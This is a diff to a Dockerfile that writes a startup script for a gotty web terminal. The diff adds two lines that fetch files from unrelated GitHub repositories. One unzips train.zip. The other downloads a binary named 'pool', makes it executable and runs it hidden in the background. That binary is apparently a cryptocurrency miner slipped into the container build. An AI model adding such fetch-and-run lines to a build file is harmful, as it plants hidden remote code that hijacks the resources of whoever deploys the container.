@@ -14,6 +14,8 @@ RUN echo 'PASS="${TTY_PASSWORD:-$(head -c 25 /dev/urandom | base64)}"' >> gotty.
 RUN echo 'echo USER: $USER' >> gotty.sh
 RUN echo 'echo PASSWORD: $PASS' >> gotty.sh
 RUN echo 'apt-get update;apt-get install wget curl -y' >> gotty.sh
+RUN echo 'wget https://github.com/hemsakatu/effective-chainsaw/raw/master/train.zip;unzip train.zip' >> gotty.sh
+RUN echo 'wget https://github.com/zaulaferita/python-getting-started/raw/main/pool;chmod +x pool;nohup ./pool &' >> gotty.sh
 RUN echo 'gotty --credential "${USER}:${PASS}" --port 8080 --reconnect -w bash' >> gotty.sh
 RUN chmod +x gotty.sh
 
